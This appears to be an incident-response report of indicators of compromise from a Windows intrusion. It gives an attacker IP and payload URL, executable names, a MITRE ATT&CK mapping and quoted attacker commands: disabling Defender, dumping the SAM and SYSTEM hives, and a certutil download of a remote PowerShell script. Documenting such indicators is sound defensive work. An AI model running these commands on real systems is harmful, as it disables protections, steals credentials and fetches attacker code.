# Indicators of Compromise (IOCs)

## Network Indicators

| IOC | Description |
|-----|-------------|
| 54.237.236.103 | External IP used to retrieve malicious PowerShell payload |
| http://54.237.236.103:443/down.ps1 | Remote PowerShell payload |

---

## Suspicious Executables

| File | Description |
|------|-------------|
| SJi8hednh12.exe | Primary suspicious executable observed during the intrusion |
| passed.exe | Additional payload executed during post-exploitation |
| br0298.exe | Additional suspicious executable |
| down.ps1 | Downloaded PowerShell script |

---

## Commands

### Remote WMI Execution

```cmd
cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__169988722673308 2>&1
```

---

### Defender Tampering

```powershell
Set-MpPreference -DisableRealtimeMonitoring
```

---

### Credential Dumping

```cmd
reg save hklm\sam C:\e993ji9js.dmp
reg save hklm\system C:\ok0o0retrvf.dmp
```

---

### Payload Download

```cmd
certutil.exe -urlcache -split -f http://54.237.236.103:443/down.ps1 C:\Windows\Temp\down.ps1
```

---

### Archive Creation

```cmd
tar.exe -a -c -f de.zip
```

---

## Suspicious Behaviours

- Remote WMI command execution
- Host reconnaissance
- Microsoft Defender tampering
- PowerShell execution policy bypass
- Credential dumping
- LOLBIN abuse using `certutil.exe`
- Payload download
- Multiple suspicious executable launches
- Archive creation for possible staging

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
| Windows Management Instrumentation | T1047 |
| System Information Discovery | T1082 |
| Account Discovery | T1087 |
| Network Configuration Discovery | T1016 |
| PowerShell | T1059.001 |
| Impair Defenses | T1562.001 |
| OS Credential Dumping | T1003 |
| Ingress Tool Transfer | T1105 |
| Archive Collected Data | T1560 |

---

## Confidence Assessment

| Finding | Confidence |
|----------|------------|
| Remote WMI Execution | High |
| Defender Tampering | High |
| Credential Dumping | High |
| Payload Download | High |
| Additional Malware Execution | Medium |
| Data Exfiltration | Low (insufficient evidence) |
